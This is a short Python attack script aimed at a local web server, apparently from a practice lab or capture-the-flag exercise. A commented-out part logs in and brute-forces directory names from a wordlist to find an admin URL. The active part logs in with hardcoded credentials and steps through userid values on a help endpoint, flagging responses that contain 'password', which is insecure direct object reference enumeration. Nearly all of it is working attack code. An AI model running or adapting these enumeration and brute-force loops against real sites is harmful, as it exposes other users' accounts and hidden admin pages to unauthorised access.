# import requests

# # 1. Setup session and credentials
# base_url = "http://localhost:30000"
# login_url = f"{base_url}/login" # Verify the actual login path on the site
# payload = {'username': 'Laksh', 'password': 'SecretPwd!'}

# s = requests.Session()

# # 2. Log in to establish the session cookie
# s.post(login_url, data=payload)

# # 3. Brute force the /v1/ directory
# prefix = f"{base_url}/v1/"
# with open('./requests-module/temp.txt', 'r') as f:
#     directories = [line.strip() for line in f]

# for directory in directories:
#     target = prefix + directory
#     r = s.get(target)
    
#     # Check for success: 200 OK or a response length that differs from 'Not Found'
#     if r.status_code == 200 and "Not Found" not in r.text:
#         print(f"[+] Found Admin URL: {target}")
#         break


import requests

base_url = "http://localhost:30000"
login_url = f"{base_url}/"
payload = {'username': 'Laksh', 'password': 'SecretPwd!'}

s = requests.Session()
s.post(login_url, data=payload)

for i in range(-100, 101):
    url = "http://localhost:30000/help/?userid=" + str(23208 + i)
    res = s.get(url)
    if (res.status_code == 200 and "password" in res.text):
        print(i)